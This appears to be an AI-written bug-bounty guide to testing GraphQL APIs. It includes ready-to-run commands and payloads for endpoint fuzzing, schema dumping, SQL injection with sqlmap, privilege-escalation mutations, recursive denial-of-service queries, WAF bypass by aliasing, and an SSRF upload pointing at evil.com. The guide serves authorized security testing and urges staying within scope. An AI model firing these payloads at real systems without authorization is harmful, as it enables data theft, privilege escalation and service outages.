Finding GraphQL vulnerabilities requires a mix of understanding GraphQL's structure, enumeration techniques, and security testing for misconfigurations. Below is a structured approach to finding GraphQL bugs:
1. Enumerate the GraphQL Endpoint

GraphQL APIs are usually found at:

    /graphql
    /api/graphql
    /v1/graphql

You can use tools like:

ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200

Or check robots.txt, JavaScript files, and browser DevTools (Network tab) for endpoint discovery.
2. Schema Introspection (If Enabled)

Some GraphQL APIs expose their entire schema, allowing attackers to see all queries, mutations, and object types.

Try sending the following request:

{
  "__schema": {
    "queryType": {
      "name": "Query"
    }
  }
}

Or use a cURL request:

curl -X POST https://target.com/graphql -d '{"query":"{ __schema { types { name } } }"}' -H "Content-Type: application/json"

If introspection is enabled, you’ll see a list of queries and types, which helps in further enumeration.

🛠 Tool: You can automate this with:

graphqlmap -u https://target.com/graphql --dump-schema

3. Find Unauthenticated Queries & Sensitive Data Exposure

After enumerating the schema, check if any queries or mutations expose sensitive data without authentication.

Try querying:

{
  "query": "{ users { id, email, passwordHash } }"
}

If the API returns emails, hashed passwords, or PII, report it immediately.

🔍 Check for:

    User emails, tokens, or hashed passwords.
    Internal API keys or configurations.
    Business-sensitive data exposure.

4. Mass Assignment & Over-Privileged Queries

GraphQL doesn’t have built-in field restrictions, so developers might accidentally allow users to modify more fields than intended.

    If you can update your role using:

{
  "mutation": "mutation { updateUser(id: 1, role: 'admin') { id, role } }"
}

and it succeeds, it’s a high-severity privilege escalation bug.
5. GraphQL Injection (SQLi, NoSQLi)

GraphQL inputs are sometimes directly used in database queries, leading to SQL Injection or NoSQL Injection.

    Try testing:

{
  "query": "{ user(id: \"1 OR 1=1\") { name, email } }"
}

or

{
  "query": "{ user(id: \"admin' --\") { name, email } }"
}

If the server returns unexpected results or errors, the API might be vulnerable to SQL injection.

🛠 Tool: sqlmap can be used:

sqlmap -u "https://target.com/graphql" --data '{"query":"{ user(id: \"1\") { email } }"}' --dbs

6. DoS via Deep Query (GraphQL Query Batching)

Some GraphQL APIs allow users to send complex, recursive queries that consume excessive resources, leading to a Denial of Service (DoS).

    Send a recursive query like:

{
  "query": "{ user { posts { author { posts { author { posts { author { name } } } } } } } }"
}

If the server crashes or slows down, report a DoS vulnerability.
7. Bypass Authentication with Aliases

Some GraphQL implementations allow query aliasing, which can help bypass certain security controls.

If a query like this is blocked:

{
  "query": "{ user(id:1) { name, email } }"
}

Try using an alias to trick the WAF:

{
  "query": "{ alias1: user(id:1) { name, email } alias2: user(id:2) { name, email } }"
}

If the request is processed, you’ve bypassed the restriction.
8. File Upload Vulnerabilities

Some GraphQL APIs allow file uploads, which can lead to:
✅ Arbitrary File Upload (RCE possibility)
✅ SSRF (Server-Side Request Forgery)

Try sending:

{
  "query": "mutation { uploadFile(file:\"http://evil.com/malicious.php\") }"
}

    If the server processes remote files, it’s vulnerable to SSRF.
    If you can upload PHP/JSP/HTML files, you might get RCE.

9. CORS Misconfiguration

Check if the API allows cross-origin requests:

curl -H "Origin: evil.com" -H "Access-Control-Request-Method: POST" -X OPTIONS https://target.com/graphql -v

If it responds with:

Access-Control-Allow-Origin: *

then any website can interact with the API, leading to account takeover via stolen API keys.
10. Automated GraphQL Security Testing

If you want to automate GraphQL security testing, use:

    GraphQLmap (graphqlmap -u https://target.com/graphql)
    InQL (Burp Suite Plugin)
    GraphQL Voyager (for schema visualization)

Bug Report Example

Title: GraphQL API Exposes User Emails Without Authentication
Description: The GraphQL API allows unauthenticated users to query sensitive user details. The following request exposes user emails:

{
  "query": "{ users { id, email } }"
}

Impact: An attacker can scrape all registered user emails, leading to phishing or spam attacks.
Recommendation: Implement proper authentication checks and restrict query access.
Final Notes

    Always check the bug bounty scope before testing.
    Never test on live systems without permission.
    Avoid running DoS attacks on production environments.

Would you like help with a specific target or PoC? 🚀

